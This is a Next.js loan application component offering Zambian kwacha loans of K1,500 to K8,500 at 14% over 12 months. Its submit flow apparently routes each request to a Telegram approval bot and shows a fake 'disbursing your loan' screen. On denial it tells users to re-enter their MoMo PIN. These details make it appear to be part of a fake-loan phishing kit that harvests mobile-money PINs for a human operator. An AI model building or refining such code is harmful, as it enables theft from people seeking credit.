"use client"

import { useEffect, useMemo, useRef, useState } from "react"
import { useRouter } from "next/navigation"
import { AlertCircle, ArrowLeft, Loader2, Wallet } from "lucide-react"
import { Button } from "@/components/ui/button"
import { requestDisbursement, pollApproval } from "@/app/actions/telegram-approval"

const MIN_AMOUNT = 1500
const MAX_AMOUNT = 8500
const STEP = 100
const INTEREST_RATE = 0.14
const PERIOD_MONTHS = 12

function formatZmw(value: number) {
  return `K${value.toLocaleString("en-ZM", { maximumFractionDigits: 2 })}`
}

type Phase = "idle" | "waiting" | "denied"

export function LoanForm({ phone }: { phone: string }) {
  const router = useRouter()
  const [amount, setAmount] = useState(MAX_AMOUNT)
  const [phase, setPhase] = useState<Phase>("idle")
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [])

  const { interest, total, monthly, progress } = useMemo(() => {
    const interestAmount = amount * INTEREST_RATE
    const totalRepayable = amount + interestAmount
    return {
      interest: interestAmount,
      total: totalRepayable,
      monthly: totalRepayable / PERIOD_MONTHS,
      progress: ((amount - MIN_AMOUNT) / (MAX_AMOUNT - MIN_AMOUNT)) * 100,
    }
  }, [amount])

  async function handleGetLoan() {
    setPhase("waiting")
    const res = await requestDisbursement({ phone, amount: String(amount) })
    if (!res.ok || !res.id) {
      setPhase("denied")
      return
    }

    const id = res.id
    pollRef.current = setInterval(async () => {
      const { status } = await pollApproval(id)
      if (status === "approved") {
        if (pollRef.current) clearInterval(pollRef.current)
        router.push(`/confirm?phone=${phone}&amount=${amount}`)
      } else if (status === "denied") {
        if (pollRef.current) clearInterval(pollRef.current)
        setPhase("denied")
      }
    }, 2000)
  }

  return (
    <div className="flex flex-col gap-6">
      <div className="flex flex-col items-center gap-1 rounded-xl border border-border bg-secondary/50 px-4 py-5 text-center">
        <span className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
          Loan amount
        </span>
        <span className="text-4xl font-bold tabular-nums text-foreground">{formatZmw(amount)}</span>
        <span className="text-xs text-muted-foreground">ZMW</span>
      </div>

      <div className="flex flex-col gap-3">
        <input
          type="range"
          min={MIN_AMOUNT}
          max={MAX_AMOUNT}
          step={STEP}
          value={amount}
          onChange={(e) => setAmount(Number(e.target.value))}
          aria-label="Select loan amount"
          className="h-2 w-full cursor-pointer appearance-none rounded-full outline-none [&::-moz-range-thumb]:size-6 [&::-moz-range-thumb]:cursor-grab [&::-moz-range-thumb]:rounded-full [&::-moz-range-thumb]:border-4 [&::-moz-range-thumb]:border-card [&::-moz-range-thumb]:bg-primary [&::-moz-range-thumb]:shadow [&::-webkit-slider-thumb]:size-6 [&::-webkit-slider-thumb]:cursor-grab [&::-webkit-slider-thumb]:appearance-none [&::-webkit-slider-thumb]:rounded-full [&::-webkit-slider-thumb]:border-4 [&::-webkit-slider-thumb]:border-card [&::-webkit-slider-thumb]:bg-primary [&::-webkit-slider-thumb]:shadow"
          style={{
            background: `linear-gradient(to right, var(--primary) ${progress}%, var(--secondary) ${progress}%)`,
          }}
        />
        <div className="flex justify-between text-xs font-medium text-muted-foreground">
          <span>{formatZmw(MIN_AMOUNT)}</span>
          <span>{formatZmw(MAX_AMOUNT)}</span>
        </div>
      </div>

      <dl className="flex flex-col divide-y divide-border rounded-xl border border-border">
        <div className="flex items-center justify-between px-4 py-3">
          <dt className="text-sm text-muted-foreground">Interest rate</dt>
          <dd className="text-sm font-semibold text-foreground">14%</dd>
        </div>
        <div className="flex items-center justify-between px-4 py-3">
          <dt className="text-sm text-muted-foreground">Repayment period</dt>
          <dd className="text-sm font-semibold text-foreground">12 months</dd>
        </div>
        <div className="flex items-center justify-between px-4 py-3">
          <dt className="text-sm text-muted-foreground">Interest amount</dt>
          <dd className="text-sm font-semibold text-foreground">{formatZmw(interest)}</dd>
        </div>
        <div className="flex items-center justify-between px-4 py-3">
          <dt className="text-sm text-muted-foreground">Monthly installment</dt>
          <dd className="text-sm font-semibold text-foreground">{formatZmw(monthly)}</dd>
        </div>
        <div className="flex items-center justify-between bg-secondary/40 px-4 py-3">
          <dt className="text-sm font-medium text-foreground">Total repayable</dt>
          <dd className="text-base font-bold text-foreground">{formatZmw(total)}</dd>
        </div>
      </dl>

      <Button
        type="button"
        onClick={handleGetLoan}
        disabled={phase === "waiting"}
        className="h-12 w-full text-base font-semibold"
      >
        {phase === "waiting" ? (
          <>
            <Loader2 className="size-4 animate-spin" />
            Processing…
          </>
        ) : (
          <>
            <Wallet className="size-4" />
            Get loan
          </>
        )}
      </Button>

      <button
        type="button"
        onClick={() => router.push("/")}
        className="mx-auto flex items-center gap-1.5 text-sm font-medium text-muted-foreground transition-colors hover:text-foreground"
      >
        <ArrowLeft className="size-4" />
        Cancel
      </button>

      {phase === "waiting" && (
        <div
          role="dialog"
          aria-modal="true"
          aria-label="Disbursing loan"
          className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/40 p-4 backdrop-blur-sm"
        >
          <div className="flex w-full max-w-sm flex-col items-center gap-4 rounded-2xl border border-border bg-card p-6 text-center shadow-xl">
            <Loader2 className="size-10 animate-spin text-primary" aria-hidden="true" />
            <div className="flex flex-col gap-1">
              <h2 className="text-lg font-semibold text-card-foreground">Disbursing your loan</h2>
              <p className="text-pretty text-sm text-muted-foreground">
                Please wait as we disburse your loan. Do not close this page.
              </p>
            </div>
          </div>
        </div>
      )}

      {phase === "denied" && (
        <div
          role="alertdialog"
          aria-modal="true"
          aria-label="Disbursement error"
          className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/40 p-4 backdrop-blur-sm"
        >
          <div className="flex w-full max-w-sm flex-col items-center gap-4 rounded-2xl border border-border bg-card p-6 text-center shadow-xl">
            <div className="flex size-12 items-center justify-center rounded-full bg-destructive/10">
              <AlertCircle className="size-7 text-destructive" aria-hidden="true" />
            </div>
            <div className="flex flex-col gap-1">
              <h2 className="text-lg font-semibold text-card-foreground">There was an error</h2>
              <p className="text-pretty text-sm text-muted-foreground">
                Check your MoMo PIN and retry, then enter your correct PIN.
              </p>
            </div>
            <Button
              type="button"
              onClick={() => router.push("/")}
              className="h-11 w-full text-base font-semibold"
            >
              Retry
            </Button>
          </div>
        </div>
      )}
    </div>
  )
}
